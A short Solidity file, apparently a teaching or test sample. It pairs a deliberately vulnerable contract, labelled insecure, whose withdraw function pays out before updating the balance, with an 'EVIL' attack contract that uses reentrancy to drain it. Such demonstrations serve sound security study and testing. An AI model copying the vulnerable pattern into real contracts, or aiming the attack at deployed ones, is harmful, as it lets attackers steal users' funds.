// SPDX-License-Identifier: MIT

pragma solidity ^0.7.0;

// INSECURE!!! DO NOT USE!!!

contract Reentrancy {
    mapping(address => uint256) private _balances;

    function withdraw(uint256 amount) public {
        require(_balances[msg.sender] >= amount);
        (bool success, ) = msg.sender.call{value: amount}(""); // solhint-disable-line avoid-low-level-calls
        require(success);
        _balances[msg.sender] -= amount;
    }

    function deposit() public payable {
        _balances[msg.sender] += msg.value;
    }

    function balanceOf(address owner) public view returns (uint256) {
        return _balances[owner];
    }
}

// EVIL!!! INSECURE!!! DO NOT USE!!!

contract ReentrancyAttack {
    function attack(Reentrancy _target) public payable {
        _target.deposit{value: msg.value}();
        _target.withdraw(msg.value);
    }

    receive() external payable {
        if (address(msg.sender).balance >= msg.value)
            Reentrancy(msg.sender).withdraw(msg.value);
    }
}
